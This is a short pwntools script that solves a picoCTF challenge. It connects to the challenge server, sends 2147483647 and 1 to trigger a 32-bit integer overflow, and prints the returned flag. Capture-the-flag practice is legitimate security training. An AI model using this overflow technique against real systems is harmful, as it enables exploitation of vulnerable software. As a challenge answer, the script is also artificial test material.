#!/usr/bin/python3
# Author: Hack.You
from pwn import *
import warnings

warnings.filterwarnings('ignore')
io = remote('saturn.picoctf.net', 64584)

io.recvuntil(b'What two positive numbers can make this possible: ')
io.sendline(b'2147483647 1')
io.recvline()
io.recvuntil(b'YOUR FLAG IS:')
flag = io.recvline()
success(flag)
